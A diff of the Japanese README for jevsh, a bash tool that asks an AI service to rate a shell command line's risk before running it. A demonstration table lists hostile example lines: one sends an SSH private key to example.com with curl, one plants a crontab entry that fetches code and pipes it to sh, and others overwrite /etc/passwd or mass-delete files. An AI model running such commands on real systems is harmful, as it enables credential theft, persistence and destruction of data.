@@ -2,56 +2,60 @@
 
 [English](README.md) | 日本語
 
-シェルコマンドを実行する前に、その危険度を JEV に尋ねます。
+**`rm -rf /` が危ないことは誰でも知っています。でも、`ls -la` は単体なら無害なのに、root のシェルで `ls -la > /etc/passwd` と打つと、ユーザー情報のファイルが上書きされてしまいます。** 危険は1つのコマンドではなく、リダイレクト、パイプ、`&&` や `;` による組み合わせ方に潜んでいることが多いのです。jevsh は、打ったとおりのコマンド行全体を、実行する直前に jev に判定させます。
 
-jevsh は、指定したコマンド行を AI サービス JEV（TypeSafe）へ送り、危険度（LOW / MEDIUM / HIGH / CRITICAL）と確信度を表示します。`y` と答えたときだけコマンドを実行します。JEV は助言するだけで、判断するのはあなたです。
+いつもどおりコマンドを打って、Enter の代わりに **Ctrl+Enter** を押すだけです。jev が危険度を判定し、`y` と答えればその行がそのまま実行されます。Enter だけを押したときは、今までとまったく同じです。
+
+root のシェル（`sudo -i` のあとなど）で:
 
 ```text
-$ jevsh rm -rf ./build
-Command: rm -rf ./build
-JEV risk: HIGH (confidence 60%)
-  LOW 1%  MEDIUM 29%  HIGH 70%  CRITICAL 0%
+# ls -la > /etc/passwd      <- Enter の代わりに Ctrl+Enter（または Ctrl+X Enter）
+Command: ls -la > /etc/passwd
+jev risk: CRITICAL (confidence 89%)
+  LOW 0%  MEDIUM 0%  HIGH 8%  CRITICAL 92%
 Run this command?
   y      run it now
   n      cancel (Enter also cancels)
 [y/N]: n
-Canceled.
+Canceled. The line stays at the prompt for editing.
 ```
+
+組み合わせ方によって初めて危険になるコマンド行の例です（root のシェル。jev の危険度と確信度、各1回、2026-09-26）。
+
+| コマンド行 | jev |
+|---|---|
+| `ls -la` | LOW 1.00 |
+| `ls -la > /etc/passwd` | CRITICAL 0.87 |
+| `sort users.csv > users.csv` | HIGH 0.92 |
+| `find / -name "*.log" \| xargs rm -f` | CRITICAL 0.89 |
+| `cat ~/.ssh/id_ed25519 \| curl -s -X POST --data-binary @- https://example.com/upload` | CRITICAL 0.50 |
+| `echo "* * * * * root curl -s http://example.com/x \| sh" >> /etc/crontab` | CRITICAL 0.89 |
+
+jevsh は、コマンド行を AI サービス jev（TypeSafe）へ送り、危険度（LOW / MEDIUM / HIGH / CRITICAL）と確信度を表示し、`y` と答えたときだけ実行します。jev は助言するだけで、判断するのはあなたです。`jevsh COMMAND` と打つ使い方や、スクリプト向けの `jevsh --check` もあります。
 
 ## 動作環境
 
 - bash 4.4 以降が動く Linux
 - `curl`
-- TypeSafe の JEV API キー
+- TypeSafe の jev API キー
 
 jevsh は bash スクリプト1ファイルです。root 権限は不要で、ほかに何もインストールしません。
 
 ## インストール
 
-次の1行を実行します。v0.3.2 のリリースをダウンロードし、`SHA256SUMS` と照合して、`~/.local/bin` にインストールし、版数を表示します。
-
 ```bash
-mkdir -p ~/.local/bin && cd "$(mktemp -d)" && curl -fsSL --remote-name-all https://raw.githubusercontent.com/takeshiue/jevsh/v0.3.2/{jevsh,SHA256SUMS} && sha256sum -c SHA256SUMS && install -m 755 jevsh ~/.local/bin/jevsh && ~/.local/bin/jevsh --version
+curl -fsSLO https://raw.githubusercontent.com/takeshiue/jevsh/main/install.sh && bash install.sh
 ```
 
-そのあと `jevsh` が「command not found」になる場合は、`~/.local/bin` がまだ `PATH` に入っていません。ログインし直すか `source ~/.profile` を実行してください。それでも入らない場合は `echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc && source ~/.bashrc` を実行します。
+`install.sh` は最新のリリースをダウンロードし、`SHA256SUMS` と照合します。`ssh-keygen` があれば、jevsh のリリース用の鍵（`SHA256:LIdW6JBHIV1YvPQHU+suSOe87ZJgNZGZlfjNdl1kkKg`）による署名も確かめます。そのうえで jevsh を `~/.local/bin` に置きます。`~/.bashrc` などには触りません。`install.sh` は短いので、実行する前に中身を読むこともできます。
 
-全ユーザー向けに入れる場合は、`install -m 755 jevsh ~/.local/bin/jevsh` の部分を `sudo install -m 755 jevsh /usr/local/bin/jevsh` に置き換えます。
+そのあと `jevsh` が「command not found」になる場合は、`~/.local/bin` がまだ `PATH` に入っていません。追加する行を `install.sh` が表示します。全ユーザー向けなど別の場所に入れる場合は `sudo JEVSH_INSTALL_DIR=/usr/local/bin bash install.sh` を実行します。
 
-jevsh は1ファイルで、インストーラーはありません。シェルへ直接流し込む（`curl ... | bash`）方法は使わないでください。
+スクリプトをシェルへ直接流し込む（`curl ... | bash`）方法は使わないでください。ダウンロードしてから実行してください。
 
-### 署名の確認（任意）
+### install.sh を使わない場合
 
-`SHA256SUMS` は jevsh のリリース用の鍵で署名しています。ダウンロードしたものが本当に作者のものかを確かめるには、インストールの1行のあと、同じディレクトリで次を実行します。
-
-```bash
-curl -fsSL --remote-name-all https://raw.githubusercontent.com/takeshiue/jevsh/v0.3.2/{SHA256SUMS.sig,jevsh-release.pub}
-ssh-keygen -lf jevsh-release.pub
-echo "takeshi.uematsu@gmail.com $(cat jevsh-release.pub)" > allowed_signers
-ssh-keygen -Y verify -f allowed_signers -I takeshi.uematsu@gmail.com -n file -s SHA256SUMS.sig < SHA256SUMS
-```
-
-2行目が表示するフィンガープリントが `SHA256:LIdW6JBHIV1YvPQHU+suSOe87ZJgNZGZlfjNdl1kkKg` であること、最後の行が `Good "file" signature` と表示することを確認します。
+jevsh は1ファイルです。タグから `jevsh` と `SHA256SUMS` をダウンロードし、`sha256sum -c --ignore-missing SHA256SUMS` で確かめてから、`PATH` の通った場所に `jevsh` を置いても使えます。
 
 ## 初回の実行
 
@@ -61,17 +65,23 @@ ssh-keygen -Y verify -f allowed_signers -I takeshi.uematsu@gmail.com -n file -s 
 
 ## 使い方
 
-```text
-jevsh [options] COMMAND [ARGS...]    評価し、確認してから実行
-jevsh [options] -c 'COMMAND LINE'    同じ（パイプなどを含む行全体）
-jevsh --check [--fail-on LEVEL] COMMAND [ARGS...]
-jevsh --check [--fail-on LEVEL] -c 'COMMAND LINE'
-jevsh --set-key
-jevsh --init bash
-jevsh --yes | --no-jev COMMAND [ARGS...]
-jevsh --enable-keybinding | --disable-keybinding
-jevsh --help | --version
-```
+| コマンド | 何をするか |
+|---|---|
+| `jevsh COMMAND [ARGS...]` | COMMAND を判定して危険度を表示し、`y` と答えたときだけ実行する |
+| `jevsh -c 'COMMAND LINE'` | 同じ。パイプやリダイレクトを含む行全体を判定する |
+| `jevsh --check COMMAND [ARGS...]` | 判定だけを行う。結果を1行（`危険度 確信度 行`）で表示し、質問も実行もしない |
+| `jevsh --check -c 'COMMAND LINE'` | 同じ。行全体を判定する |
+| `jevsh --check --fail-on LEVEL ...` | さらに、危険度が LEVEL 以上なら終了ステータス 1 を返す（スクリプト向け） |
+| `jevsh --yes COMMAND [ARGS...]` | 判定して結果を表示し、確認せずに実行する |
+| `jevsh --no-jev COMMAND [ARGS...]` | 判定も確認もせずに実行する |
+| `jevsh --set-key` | jev の API キーを登録する（置き換える） |
+| `jevsh --enable-keybinding` | Ctrl+Enter / Ctrl+X Enter で判定する機能を `~/.bashrc` に追加する（事前に確認し、バックアップを残す） |
+| `jevsh --disable-keybinding` | その機能を `~/.bashrc` から取り除く |
+| `jevsh --init bash` | Ctrl+Enter の機能に使う bash のコードを表示する。`~/.bashrc` が実行するもので、自分で使うことはほとんどない |
+| `jevsh --help` | ヘルプを表示する |
+| `jevsh --version` | 版数と日付を表示する |
+
+LEVEL は `LOW`、`MEDIUM`、`HIGH`、`CRITICAL` のいずれかです。オプションはコマンドより前に書きます。コマンド自体が `-` で始まる場合は `--` を挟みます。
 
 コマンドを実行するのは `y` か `Y` と答えたときだけです。Enter だけを含め、それ以外の答えはすべて中止になります。
 
@@ -83,7 +93,7 @@ jevsh --help | --version
 export JEVSH_AUTO_RUN=LOW       # LOW は確認なしで実行、MEDIUM 以上は従来どおり確認
 ```
 
-`MEDIUM` にすると、LOW と MEDIUM が確認なしで実行されます。評価結果は表示され、続けて `Running without asking (...)` と表示されます。評価できなかったときは必ず確認し、端末がない場合は何も実行しません。`jevsh COMMAND` と評価キーの両方で有効です。
+`MEDIUM` にすると、LOW と MEDIUM が確認なしで実行されます。評価結果は表示され、続けて `Running without asking (...)` と表示されます。評価できなかったときは必ず確認し、端末がない場合は何も実行しません。`jevsh COMMAND` と Ctrl+Enter の両方で有効です。
 
 ### パイプとリダイレクト
 
@@ -94,11 +104,11 @@ jevsh -c 'cat data.csv | sort > out.txt'    # 行全体を評価する
 jevsh cat data.csv | sort > out.txt         # "cat data.csv" だけを評価する
 ```
 
-### 評価キー
+### Ctrl+Enter で判定する
 
-評価キーを使うと、`jevsh` も引用符も打つ必要がありません。いつもどおりコマンドを打ち、Enter の代わりに **Ctrl+X Enter** を押します。パイプやリダイレクトを含む行全体が評価されます。`n` と答えると、行が入力欄に残るので、直してから実行できます。Enter だけを押したときは、今までどおり評価なしで実行されます。
+この機能を使うと、`jevsh` も引用符も打つ必要がありません。いつもどおりコマンドを打ち、Enter の代わりに **Ctrl+X Enter** を押します。パイプやリダイレクトを含む行全体が評価されます。`n` と答えると、行が入力欄に残るので、直してから実行できます。Enter だけを押したときは、今までどおり評価なしで実行されます。
 
-jevsh は API キーを登録した直後に、評価キーを追加するか尋ねます。いつでも追加・削除できます。
+jevsh は API キーを登録した直後に、この機能を `~/.bashrc` に追加するか尋ねます。いつでも追加・削除できます。
 
 ```bash
 jevsh --enable-keybinding     # ~/.bashrc に目印付きのブロックを追加（事前に確認し、バックアップを残す）
@@ -148,7 +158,7 @@ fi
 
 ### シェルスクリプトの中では
 
-- 評価キーは、対話中の bash のプロンプトでだけ働きます。シェルスクリプトの中の行は、今までどおり評価なしで実行されます。
+- Ctrl+Enter で判定する機能は、対話中の bash のプロンプトでだけ働きます。シェルスクリプトの中の行は、今までどおり評価なしで実行されます。
 - スクリプトの中に `jevsh COMMAND` と書いた場合、端末から起動したスクリプトなら、その都度端末に確認が出ます。`y` と答えると実行されます。
 - 端末がない場合（cron、CI、`nohup` など）は確認できないため、コマンドを実行せず終了ステータス 4 で終わります。確認されていないものを実行しないための意図した動きです。
 - 自動処理では、`--check` と `--fail-on` を使い、スクリプト側で判断します。
@@ -193,7 +203,7 @@ rm -r ~/.config/jevsh
 
 ## 速さと精度
 
-jevsh を通すと、1コマンドあたり約0.2秒増えます。そのほとんどは JEV API との通信です。40のコマンド行の例では、JEV の危険度が作者の予想と一致したのは、3回それぞれ40行中29〜31行でした。結果の全体と生データは [docs/benchmark.ja.md](docs/benchmark.ja.md) にあります。
+jevsh を通すと、1コマンドあたり約0.2秒増えます。そのほとんどは jev API との通信です。40のコマンド行の例では、jev の危険度が作者の予想と一致したのは、3回それぞれ40行中29〜31行でした。結果の全体と生データは [docs/benchmark.ja.md](docs/benchmark.ja.md) にあります。
 
 ## ライセンス
 
